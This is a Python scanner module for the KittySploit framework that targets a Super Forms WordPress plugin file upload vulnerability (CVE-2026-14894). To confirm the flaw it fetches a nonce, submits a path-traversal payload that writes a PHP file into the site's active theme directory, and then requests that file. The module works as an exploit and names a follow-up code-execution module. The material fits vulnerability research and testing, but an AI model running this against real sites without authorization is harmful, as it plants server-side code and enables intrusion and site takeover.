#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Super Forms <= 6.3.313 arbitrary file upload (CVE-2026-14894)."""

import base64
import json
import re
import secrets
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "super-forms"
_VULN_HIGH = (6, 3, 313)
_MARKER = "CVE-2026-14894-sfrce"


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Super Forms CVE-2026-14894 upload detect",
        "description": (
            "Detects CVE-2026-14894: super_submit_form writes PHP under active theme via "
            "path traversal in sf_upload_field data URI."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-14894",
        "references": ["https://github.com/shinthink/CVE-2026-14894"],
        "modules": ["exploits/multi/http/super_forms_cve_2026_14894_upload_rce"],
        "tags": ["web", "scanner", "wordpress", "super-forms", "cve-2026-14894"],
        "agent": {
            "approval_required": True,
            "chain": {"suggested_followups": ["exploits/multi/http/super_forms_cve_2026_14894_upload_rce"]},
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _theme(self, html: str) -> str:
        m = re.search(r"wp-content/themes/([a-zA-Z0-9_-]+)/", html or "")
        return m.group(1) if m else ""

    def _nonce(self) -> str:
        r = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            params={"action": "super_create_nonce"},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={"action": "super_create_nonce"},
            allow_redirects=False,
        )
        if not r:
            return ""
        m = re.search(r"([a-f0-9]{10,})", r.text or "")
        return m.group(1) if m else ""

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self.wp_normalize_base_path(self.base_path or "/")) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
        if not home:
            return False
        theme = self._theme(home.text or "")
        nonce = self._nonce()
        if not theme or not nonce:
            return False
        rand = f"ks{secrets.token_hex(3)}"
        php = f"<?php echo '{_MARKER}'; die(); ?>"
        b64 = base64.b64encode(php.encode()).decode()
        payload = {
            "sf_upload_field": {
                "type": "files",
                "files": [
                    {
                        "value": f"../../../../../themes/{theme}/{rand}.php",
                        "datauristring": f"data:image/png;base64,{b64}",
                        "name": f"{rand}.php",
                        "label": "attachment",
                    }
                ],
            }
        }
        data = f"sf_nonce={nonce}&form_id=1&data={quote(json.dumps(payload, separators=(',', ':')))}"
        self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            params={"action": "super_submit_form"},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data,
            allow_redirects=False,
        )
        check = self.http_request(
            method="GET",
            path=self._join(f"/wp-content/themes/{theme}/{rand}.php"),
            allow_redirects=False,
        )
        if check and check.status_code == 200 and _MARKER in (check.text or ""):
            self.set_info(
                severity="critical",
                reason="Super Forms CVE-2026-14894 theme PHP write confirmed",
                path=f"/wp-content/themes/{theme}/",
                cve="CVE-2026-14894",
            )
            return True
        return False
